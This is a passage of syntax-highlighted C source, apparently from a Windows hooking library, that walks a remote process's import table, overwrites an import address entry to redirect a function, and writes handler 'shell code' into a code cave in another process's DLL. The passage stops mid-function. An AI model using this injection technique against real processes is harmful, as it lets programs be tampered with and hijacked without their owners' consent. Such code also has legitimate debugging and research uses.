                <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">+</span> <span class="n">counter</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">)),</span>
                <span class="o">&amp;</span><span class="n">ThunkDataIAT</span><span class="p">,</span>
                <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_THUNK_DATA</span><span class="p">),</span>
                <span class="nb">NULL</span>
            <span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpThunkINTBuffer) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="cm">/* Check if we reached the end of the array */</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">ThunkDataIAT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">firstRVA</span> <span class="o">=</span> <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">;</span>

            <span class="cm">/* </span>
<span class="cm">             * Huge problem here is that the RVA&#39;s pointing to the names of the function in the IAT</span>
<span class="cm">             * are not in a ascending order. The RVA&#39;s may even be broken (yeah the linkers are bad^^)</span>
<span class="cm">             * and we may get invalid indices. How can we figure out that we do have a valid RVA in  </span>
<span class="cm">             * pThunkDataINT-&gt;u1.AddressOfData ?!</span>
<span class="cm">             * There are just bad solutions (or lazyness when it comes to </span>
<span class="cm">             * heuristic fine tuning, so we apply a heuristic function on all RVA&#39;s of the </span>
<span class="cm">             * IMAGE_THUNK_DATA INT array to ignore RVA&#39;s which have a absolute difference from </span>
<span class="cm">             * more than 0x5000 bytes to the first RVA. What happens if the first RVA is a invalid </span>
<span class="cm">             * one? We&#39;re screwed, but at least the other is able to locate the problem quickly.</span>
<span class="cm">             */</span>
            <span class="c1">// test if we stumbled upon a suspicious RVA (after hoping that the first is not :/)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">abs</span><span class="p">(</span><span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">firstRVA</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x5000</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">RVA in INT-&gt;u1.AddressOfData might be broken (%x) - ignoring</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                    <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>

                <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
                <span class="p">(</span>
                    <span class="o">&amp;</span><span class="n">lpFunctionNameBuf</span><span class="p">,</span>
                    <span class="n">hProcess</span><span class="p">,</span>
                    <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">),</span>
                    <span class="n">BUFFER_SIZE_SMALL</span>
                <span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpFunctionNameBuf) in HookFunction() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
                        <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lpFunctionNameBuf</span><span class="p">);</span>
                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">pImageImportByName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)</span><span class="n">lpFunctionNameBuf</span><span class="p">;</span>

                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\t</span><span class="s">%s: 0x%x : 0x%x&quot;</span><span class="p">,</span> <span class="n">pImageImportByName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span>
                                <span class="n">ThunkDataIAT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">,</span> <span class="n">functionOffset</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">functionOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
            <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">pImageImportDescriptor</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* We can free up now the allocated buffer */</span>
    <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="cm">/* </span>
<span class="cm"> * Looks up the function address in the IAT with LibName and funcName and </span>
<span class="cm"> * patches the pointer to the value in redirection. If the function succeeds, it will</span>
<span class="cm"> * return the OLD function pointer, so you can save it to restore the default behaviour. If </span>
<span class="cm"> * HookFunction fails, it will return FALSE(0).</span>
<span class="cm"> */</span>
<span class="n">DWORD</span> <span class="nf">PatchIAT</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">imageImportDirectory</span><span class="p">,</span>
     <span class="n">DWORD</span> <span class="n">imageBase</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">libName</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">funcName</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">redirectionAddress</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PCHAR</span> <span class="n">buf</span><span class="p">,</span> <span class="n">dllNameBuf</span><span class="p">;</span>
    <span class="n">PCHAR</span> <span class="n">lpFunctionNameBuf</span><span class="p">;</span>
    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">pImageImportDescriptor</span><span class="p">;</span>
    <span class="n">IMAGE_THUNK_DATA</span> <span class="n">ThunkDataINT</span><span class="p">,</span> <span class="n">ThunkDataIAT</span><span class="p">;</span>
    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">pImageImportByName</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">functionOffset</span><span class="p">,</span> <span class="n">firstRVA</span><span class="p">,</span> <span class="n">counter</span><span class="p">,</span> <span class="n">functionMemValue</span><span class="p">;</span>

    <span class="n">firstRVA</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">functionMemValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">BOOL</span> <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
    <span class="p">(</span>
        <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">imageImportDirectory</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span>
        <span class="mi">50</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_IMPORT_DESCRIPTOR</span><span class="p">)</span> <span class="c1">// not more than 50 dll&#39;s in a module :)</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(buf) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
            <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pImageImportDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
    <span class="cm">/* </span>
<span class="cm">     * pImageImportDescriptor[index].Characteristics is </span>
<span class="cm">     * set to 0 to indicate the end of the array of IMAGE_IMPORT_DESCRIPTORs.</span>
<span class="cm">     */</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">Characteristics</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Read the memory of the DLLName:) */</span>
        <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
        <span class="p">(</span>
            <span class="o">&amp;</span><span class="n">dllNameBuf</span><span class="p">,</span>
            <span class="n">hProcess</span><span class="p">,</span>
            <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">),</span>
            <span class="n">BUFFER_SIZE_SMALL</span>
        <span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(dllNameBuf) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dllNameBuf</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">functionOffset</span> <span class="o">=</span> <span class="p">(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">);</span>
        <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* Read the memory of the INT thunk table element :) */</span>
            <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
            <span class="p">(</span>
                <span class="n">hProcess</span><span class="p">,</span>
                <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">OriginalFirstThunk</span> <span class="o">+</span> <span class="n">counter</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">)),</span>
                <span class="o">&amp;</span><span class="n">ThunkDataINT</span><span class="p">,</span>
                <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_THUNK_DATA</span><span class="p">),</span>
                <span class="nb">NULL</span>
            <span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpThunkINTBuffer) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="cm">/* Read the memory of the IAT thunk table element :) */</span>
            <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
            <span class="p">(</span>
                <span class="n">hProcess</span><span class="p">,</span>
                <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">+</span> <span class="n">counter</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">)),</span>
                <span class="o">&amp;</span><span class="n">ThunkDataIAT</span><span class="p">,</span>
                <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_THUNK_DATA</span><span class="p">),</span>
                <span class="nb">NULL</span>
            <span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpThunkINTBuffer) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="cm">/* Check if we reached the end of the array */</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">ThunkDataIAT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="k">break</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">firstRVA</span> <span class="o">=</span> <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">;</span>

            <span class="cm">/* </span>
<span class="cm">             * Huge problem here is that the RVA&#39;s pointing to the names of the function in the IAT</span>
<span class="cm">             * are not in a ascending order. The RVA&#39;s may even be broken (yeah the linkers are bad^^)</span>
<span class="cm">             * and we may get invalid indices. How can we figure out that we do have a valid RVA in  </span>
<span class="cm">             * pThunkDataINT-&gt;u1.AddressOfData ?!</span>
<span class="cm">             * There are just bad solutions (or lazyness when it comes to </span>
<span class="cm">             * heuristic fine tuning, so we apply a heuristic function on all RVA&#39;s of the </span>
<span class="cm">             * IMAGE_THUNK_DATA INT array to ignore RVA&#39;s which have a absolute difference from </span>
<span class="cm">             * more than 0x5000 bytes to the first RVA. What happens if the first RVA is a invalid </span>
<span class="cm">             * one? We&#39;re screwed, but at least the other is able to locate the problem quickly.</span>
<span class="cm">             */</span>
            <span class="c1">// test if we stumbled upon a suspicious RVA (after hoping that the first is not :/)</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">abs</span><span class="p">(</span><span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">firstRVA</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x5000</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">RVA in INT-&gt;u1.AddressOfData might be broken (%x) - ignoring</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                    <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>

                <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
                <span class="p">(</span>
                    <span class="o">&amp;</span><span class="n">lpFunctionNameBuf</span><span class="p">,</span>
                    <span class="n">hProcess</span><span class="p">,</span>
                    <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">ThunkDataINT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">),</span>
                    <span class="n">BUFFER_SIZE_SMALL</span>
                <span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpFunctionNameBuf) in HookFunction() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
                        <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lpFunctionNameBuf</span><span class="p">);</span>
                    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">pImageImportByName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)</span><span class="n">lpFunctionNameBuf</span><span class="p">;</span>

                <span class="cm">/* When we are in the whished IAT entry, we write to the process the new value of the function pointer */</span>
                <span class="k">if</span> 
                <span class="p">(</span>
                    <span class="n">_stricmp</span><span class="p">(</span><span class="n">pImageImportByName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">funcName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
                    <span class="n">_stricmp</span><span class="p">(</span><span class="n">dllNameBuf</span><span class="p">,</span> <span class="n">libName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
                <span class="p">)</span> <span class="p">{</span>
                    <span class="n">functionMemValue</span> <span class="o">=</span> <span class="n">ThunkDataIAT</span><span class="p">.</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">;</span> <span class="cm">/* save because the struct will be freed up*/</span>

                    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetWriteProcessMemory</span>
                    <span class="p">(</span>
                        <span class="n">hProcess</span><span class="p">,</span>
                        <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">functionOffset</span><span class="p">,</span>
                        <span class="p">(</span><span class="n">LPCVOID</span><span class="p">)</span><span class="o">&amp;</span><span class="n">redirectionAddress</span><span class="p">,</span>
                        <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">redirectionAddress</span><span class="p">)</span>
                    <span class="p">);</span>

                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetWriteProcessMemory() in HookFunction() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
                            <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lpFunctionNameBuf</span><span class="p">);</span>
                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&quot;[i] Patched the IAT API %s in DLL %s at address 0x%x :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                                             <span class="n">pImageImportByName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">dllNameBuf</span><span class="p">,</span> <span class="n">functionOffset</span><span class="p">);</span>
                        <span class="k">break</span><span class="p">;</span> <span class="cm">/* break the while loop because we updated the IAT*/</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">functionOffset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
            <span class="n">counter</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="cm">/* have we just been to the searched DLL? Assumes that Dll-Names in the IAT are uniqe */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">(</span><span class="n">dllNameBuf</span><span class="p">,</span> <span class="n">libName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//free(&amp;dllNameBuf);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">pImageImportDescriptor</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* We can free up now the allocated buffer */</span>
    <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">functionMemValue</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="cm">/*</span>
<span class="cm"> * Does the actual hooking. Finds a code cave in the .text section of the </span>
<span class="cm"> * DLL which exports the function specified by funcName. It writes the handler into</span>
<span class="cm"> * the code cave. The sanity of the handler is not a problem of this library.</span>
<span class="cm"> */</span>
<span class="n">HOOK_CONTEXT</span> <span class="o">*</span>
<span class="nf">HookFunction</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">libName</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">funcName</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">handlerBuf</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">handlerSize</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">pPEP</span><span class="p">,</span> <span class="n">oldFunctionPointer</span><span class="p">,</span> <span class="n">pHandler</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">nBytesWritten</span><span class="p">;</span>
    <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">imageImportDirectory</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">bSuccess</span><span class="p">;</span>
    <span class="n">HOOK_CONTEXT</span> <span class="o">*</span><span class="n">pHookContext</span><span class="p">;</span>

    <span class="n">pHookContext</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">HOOK_CONTEXT</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pHookContext</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc in HookFunction() failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Locate the Process Environment Block */</span>
    <span class="n">pPEP</span> <span class="o">=</span> <span class="n">FindRemotePEB</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pPEP</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] FindRemotePEB() failed...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Remote PEB found: 0x%x. ImageBase address is 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                             <span class="n">pPEP</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)((</span><span class="n">PPEB</span><span class="p">)</span><span class="n">pPEP</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* Read the RVA to the ImageImportDirectory */</span>
    <span class="n">imageImportDirectory</span> <span class="o">=</span> <span class="n">ReadRemoteDataDirectoryRVA</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span>
                                <span class="p">(</span><span class="n">LPCVOID</span><span class="p">)((</span><span class="n">PPEB</span><span class="p">)</span><span class="n">pPEP</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">imageImportDirectory</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] ReadRemoteDataDirectoryRV() failed...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Remote Image Parsed. Virtual Address of RemoteDataDirectory: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                                                         <span class="n">imageImportDirectory</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* Find a code cave where to write the handler */</span>
    <span class="n">pHandler</span> <span class="o">=</span> <span class="n">FindRemoteCodeCave</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="p">((</span><span class="n">PPEB</span><span class="p">)</span><span class="n">pPEP</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">ImageBaseAddress</span><span class="p">,</span>
        <span class="n">libName</span><span class="p">,</span>
        <span class="n">handlerSize</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pHandler</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Cannot find code cave in remote image...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Code cave found.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="cm">/* Write the shell code into the code cave :) */</span>
    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">WriteProcessMemory</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">pHandler</span><span class="p">,</span>
        <span class="p">(</span><span class="n">LPCVOID</span><span class="p">)</span><span class="n">handlerBuf</span><span class="p">,</span>
        <span class="n">handlerSize</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">nBytesWritten</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[!] Couldn&#39;t write shell code. Wrote %d bytes instead of %d...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                                                                     <span class="n">nBytesWritten</span><span class="p">,</span> <span class="n">handlerSize</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span>
